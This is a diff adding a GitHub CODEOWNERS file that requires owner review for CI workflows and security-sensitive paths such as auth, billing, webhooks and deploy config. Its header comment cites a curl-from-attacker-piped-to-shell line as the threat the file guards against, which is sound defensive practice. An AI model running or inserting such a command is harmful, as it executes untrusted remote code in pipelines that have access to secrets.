@@ -1,0 +1,40 @@
+# CODEOWNERS for MyLife.
+#
+# Primary purpose: require owner review for changes to CI workflows and
+# security-sensitive configuration so a compromised or rogue contributor
+# cannot ship `run: curl attacker | sh` to CI without a second pair of eyes.
+#
+# Docs: https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-code-owners
+#
+# NOTE: CODEOWNERS only enforces review when the branch protection rule
+# "Require review from Code Owners" is enabled on the default branch. Add
+# that rule alongside this file for the guard to take effect.
+
+# Catch-all: the repo owner is the default reviewer for everything.
+*                                   @tshuldberg
+
+# CI and workflow files: require explicit owner review. These files control
+# what executes on every PR and have access to secrets.
+/.github/                           @tshuldberg
+/.github/workflows/                 @tshuldberg
+/.github/CODEOWNERS                 @tshuldberg
+
+# Security boundaries: signing, entitlements, webhooks, auth, PIN hashing,
+# and admin-key-gated routes. Any change to these files needs owner review
+# regardless of the rest of the PR.
+/packages/auth/                     @tshuldberg
+/packages/entitlements/             @tshuldberg
+/apps/web/app/api/webhooks/         @tshuldberg
+/apps/web/app/api/entitlements/     @tshuldberg
+/apps/web/app/api/identity/         @tshuldberg
+/apps/web/app/api/access/           @tshuldberg
+/apps/web/lib/admin-key.ts          @tshuldberg
+/apps/web/lib/actor-identity.ts     @tshuldberg
+/apps/web/lib/billing/              @tshuldberg
+/apps/web/middleware.ts             @tshuldberg
+
+# Supply chain scan config: changes here affect whether CVEs are caught.
+/.github/osv-scanner.toml           @tshuldberg
+
+# Deployment configuration.
+/deploy/                            @tshuldberg
